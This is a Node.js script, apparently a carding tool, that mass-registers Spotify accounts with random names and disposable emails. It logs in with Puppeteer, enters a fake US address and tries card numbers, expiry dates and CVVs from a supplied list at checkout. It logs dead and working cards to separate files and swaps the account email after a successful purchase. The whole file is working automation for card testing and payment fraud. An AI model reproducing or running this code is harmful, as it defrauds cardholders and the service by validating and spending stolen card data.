const readlineSync = require('readline-sync');
const puppeteer = require('puppeteer-extra');
var random_name = require('node-random-name');
const fs = require('fs');
const delay = require('delay');
const S = require('string'  );
const { error, Console } = require('console');
const { type } = require('os');
var no = 1;
var moment = require("moment");
var figlet = require('figlet');
var chalk = require('chalk');
var fetch = require('node-fetch');
var request = require('request');


(async () => {

    console.log(
        chalk.redBright(
        figlet.textSync('Spotify Creator', { horizontalLayout: 'fitted' })
    )
    );
    console.log(
        chalk.greenBright(
        figlet.textSync('                                       +', { horizontalLayout: 'fitted' })
    )
    );
    console.log(
        chalk.whiteBright(
        figlet.textSync('Spotify Autopay', { horizontalLayout: 'fitted' })
    )
    );
    console.log('\n')
    console.log('[+] Information DUO Url Plan       : https://www.spotify.com/ca-en/purchase/offer/duo-1m-intro/?psp=billing_adyen_cards&country=US')
    console.log('[+] Information Family US Url Plan : https://www.spotify.com/us/purchase/offer/new-family-1m/?psp=billing_adyen_cards&country=US')
    console.log('[+] Information DUO PAY Url Plan : https://www.spotify.com/ca-en/purchase/offer/duo/?psp=billing_adyen_cards&country=US')
    console.log('[+] Information 3 Monts Url Plan : https://www.spotify.com/jp/purchase/offer/default-trial-3m/?marketing-campaign-id=default&country=JP')
    console.log('\n')
    const passwd = await readlineSync.question('[+] Password Anda      : ')

    var urlPlan = readlineSync.question(chalk.whiteBright('[+] Link Url Plan      : '))
    var cc2 = readlineSync.question(chalk.whiteBright('[+] Input List CC      : '));
    const file2 = fs.readFileSync(cc2, 'UTF-8');
    const mntp2 = file2.split(/\r?\n/);
    var i = 0;
    while (true) {
        var pay = i + 5;
        var nama1 = random_name({
            first: true
        });
        var nama2 = random_name({
            last: true
        });
        var hasil1 = Math.floor(Math.random() * 100) + 21;
        const creator = await fetch('https://spclient.wg.spotify.com/signup/public/v1/account/', {
                method: 'POST',
                body: 'key=142b583129b2df829de3656f9eb484e6&password=' + passwd + '&creation_point=client_mobile&name=Aww&gender=male&iagree=true&platform=Android-ARM&birth_day=6&birth_month=4&birth_year=2006&password_repeat=' + passwd + '&email=' + nama1 + '' + nama2 + '' + hasil1 + '%40silvistore.my.id' + '&email=' + nama1 + '' + nama2 + '' + hasil1 + '%40silviapeachy.store'
            }).then(async res => {
                const data = await res.json()
                return data
            })

        console.log('\n')
        if (creator['status'] == 1) {
            console.log(chalk.redBright('[' + no + ']' + ' Pembuatan Akun Berhasil',chalk.whiteBright( nama1 + nama2 + hasil1 + '@silvistore.my.id|' + passwd)))
            const $options = {
                    waitUntil: 'networkidle2'
                };
            const browser = await puppeteer.launch({
                    executablePath:'C:/Users/user/AppData/Local/Google/Chrome/Application/chrome.exe',
                    headless:true,
                    devtools:false,
                })
            const page = await browser.newPage();
            console.log(chalk.redBright('[' + '+' + ']',chalk.blueBright('Proses Login...')))
            await page.goto(urlPlan, $options);
            await page.waitForSelector("input[type=text");
            const emailField = await page.$('input[type=text]')
            await emailField.type(nama1 + nama2 + hasil1 + '@silvistore.my.id')
            await emailField.dispose()
            await delay(3000)
            await page.waitForSelector("input[type=password]");
            const passwordField = await page.$('input[type=password]')
            await passwordField.type(passwd)
            await passwordField.dispose()

            await page.waitForSelector("button[id=login-button]");
            const buttonField = await page.$('button[id=login-button]')
            await buttonField.click()
            await buttonField.dispose()

            await delay(8000)
            if (page.url().includes('login')) {
                console.log(chalk.redBright('[' + '+' + ']' + ' Login Gagal ' + nama1 + nama2 + hasil1 + '@silvistore.my.id' + '|' + passwd));
                await browser.close()
                no++
            }else if (page.url().includes('purchase')) {
                console.log(chalk.whiteBright('[' + '+' + ']' + ' Berhasil Login ' + nama1 + nama2 + hasil1 + '@silvistore.my.id' + '|' + passwd));
                await page.reload();

                no++
                await page.reload();
		await delay(1000)
                    try {
                    await page.waitForSelector('#address-street', {visible: true, timeout:15000});
                    const street = await page.$('#address-street');
                    await street.type("NYC STREET")
                    await street.dispose()

                    await page.waitForSelector('#address-city', {visible: true, timeout:15000});
                    const city = await page.$('#address-city');
                    await city.type("New York City")
                    await city.dispose()

                    await page.select('select[id="address-state"]', 'NY');                  
                    await page.waitForSelector('#address-postal_code_short', {visible: true, timeout:15000});
                    const zip1 = await page.$('#address-postal_code_short');
                    await zip1.type("10080")  
                    await zip1.dispose()  
                console.log(chalk.blueBright('    Waiting For Input Data'))
	} catch (err) {
}
                await page.waitForSelector(".pci-iframe");
                const elementHandle = await page.$('.pci-iframe');
                const frames = await elementHandle.contentFrame();

                for (i; i < pay; i++) {

                    var cardnum = mntp2[i].split('|')[0];
                    var cardmonth = mntp2[i].split('|')[1];
                    var cardyear = mntp2[i].split('|')[2];
                    if (cardyear<22)
		    {
		    	var cardyear = 22;
		    }else if(cardyear>2000) {
			var cardyear = 22;
		    }

                    var cardcvv = mntp2[i].split('|')[3];
                    const cardNumber = await frames.$('input[id="cardnumber"]')
                    await frames.focus('input[id="cardnumber"]');
                    await page.keyboard.down('Control');
                    await page.keyboard.press('A');
                    await page.keyboard.up('Control');
                    await page.keyboard.press('Backspace');
                    await cardNumber.type(cardnum)
                    await cardNumber.dispose()

                    const expiredYear = await frames.$('#expiry-date')
                    await frames.focus('#expiry-date');
                    await page.keyboard.down('Control');
                    await page.keyboard.press('A');
                    await page.keyboard.up('Control');
                    await page.keyboard.press('Backspace');
                    await expiredYear.type(cardmonth + cardyear)
                    await expiredYear.dispose()

                    const cardCVV = await frames.$('#security-code')
                    await frames.focus('#security-code');
                    await page.keyboard.down('Control');
                    await page.keyboard.press('A');
                    await page.keyboard.up('Control');
                    await page.keyboard.press('Backspace');

                    await cardCVV.type(cardcvv)
                    await cardCVV.dispose()


                    await page.keyboard.press('Enter');
                    await page.waitForSelector('#checkout_submit')
                    const clickPay2 = await page.$('#checkout_submit')
                    await clickPay2.click()
                    await page.keyboard.press('Enter');
                    try {
			if (page.url().includes('purchase')) {
			i = i;
                        await page.waitForSelector('#__next > main > div > div > section.CheckoutSDKWrapperContainer-xc5z6m-0.frDkGU > div > div.sc-jcFkyM.ihvgJG > div > p')
                        const infoFailed = await page.evaluate(() => {
                            return document.querySelector('#__next > main > div > div > section.CheckoutSDKWrapperContainer-xc5z6m-0.frDkGU > div > div.sc-jcFkyM.ihvgJG > div > p').innerText;
                        })
                        console.log(chalk.yellowBright('   ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv,chalk.redBright( 'Information : ', infoFailed)));
                        fs.appendFileSync("CC DIE.txt", cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv + '\n');
                }	  
                        continue;  
                await browser.close()
		} catch (err) {
                        if (page.url().includes('success')) {
			    i++
                            console.log(chalk.greenBright('   ', cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv,chalk.greenBright( 'Information : Berhasil Premium')));
                            fs.appendFileSync("CC SPOTIFY.txt", cardnum + '|' + cardmonth + '|' + cardyear + '|' + cardcvv + '\n');
                            console.log(chalk.redBright('[' + '=' + ']' + ' Proses Change Email'))
                            await page.goto("https://generator.email/", $options);
                            await page.waitForSelector('#email_ch_text')
                            const infoemail = await page.evaluate(() => {
                            return document.querySelector('#email_ch_text').innerText;
                            })
                            console.log(chalk.whiteBright('[' + '-' + ']',(infoemail)));
                            await page.waitForSelector("#copbtn");
                            const email1 = await page.$('#copbtn')
                            await email1.click()
                            await page.goto("https://www.spotify.com/ca-en/account/profile/", $options);   
                            await page.waitForSelector('#email', {visible: true, timeout:15000});
                            const street1 = await page.$('#email');
                            await street1.type("NYC STREET")
                            await street1.dispose()
                            await page.keyboard.down('Control');
                            await page.keyboard.press('A');
                            await page.keyboard.up('Control');
                            await page.keyboard.down('Control');
                            await page.keyboard.press('v');
                            await page.keyboard.up('Control');
                            await page.waitForSelector('#password', {visible: true, timeout:15000});
                            const street2 = await page.$('#password');
                            await street2.type(passwd)
                            await street2.dispose()  
                            await delay(3000)    
                            await page.keyboard.press('Enter');                   
                             console.log(chalk.redBright('[' + '=' + ']' + ' CHANGE EMAIL BERHASIL',chalk.whiteBright((infoemail))))
                            fs.appendFileSync("spotifypremium USA.txt", infoemail + '\n');
                            
                        }
                        break;
                    }
                }
                await browser.close()
            }
        }else if(creator['status'] == 20){
            no++
            console.log('[' + no + ']' + ' Akun sudah pernah dibuat', nama1 + nama2 + hasil1 + '@silvistore.my.id|' + passwd)
        }else{
            no++
            console.log('[' + no + ']' + ' ERROR!!', nama1 + nama2 + hasil1 + '@silvistore.my.id|' + passwd)
        }

    }

})();